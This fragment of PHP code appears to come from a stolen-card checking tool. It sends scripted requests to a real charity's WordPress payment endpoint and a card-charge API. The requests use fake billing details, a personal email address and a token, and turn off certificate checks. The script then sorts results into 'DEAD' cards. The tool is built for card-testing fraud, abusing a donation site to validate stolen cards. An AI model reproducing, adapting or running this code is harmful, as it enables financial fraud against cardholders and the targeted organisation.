...
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://aadhyagolifoundation.org/wp-admin/admin-ajax.php');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=asp_pp_create_pi&amount=100&curr=INR&product_id=880&quantity=1&billing_details={"name":"Mike Smith","email":"yadavsahil1836@gmail.com","address":{"line1":"123 Allen Street, Behind New York","city":"New York","state":"New York","country":"US","postal_code":"10080"}}&shipping_details={"name":"Mike Smith","address":{"line1":"123 Allen Street, Behind New York","city":"New York","state":"New York","country":"US","postal_code":"10080"}}&token=f101a1e14b11095323111d26c9660c5b');
...
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=eur&payment_method_types[]=card&description=AlwaysSahil Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
...
elseif (strpos($result1, "testmode_charges_only")) {
	echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: Your account cannot currently make live charges.</span><br>';
}
